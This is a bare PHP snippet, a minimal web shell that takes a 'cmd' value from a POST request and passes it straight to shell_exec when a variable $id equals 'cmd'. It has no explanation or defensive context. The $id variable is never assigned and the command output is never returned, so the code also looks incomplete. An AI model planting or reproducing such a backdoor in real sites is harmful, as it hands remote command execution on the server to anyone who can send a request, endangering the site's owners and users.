<?php
$cmd=$_POST['cmd'];
if($id=="cmd")
	$result=shell_exec("$cmd");
?>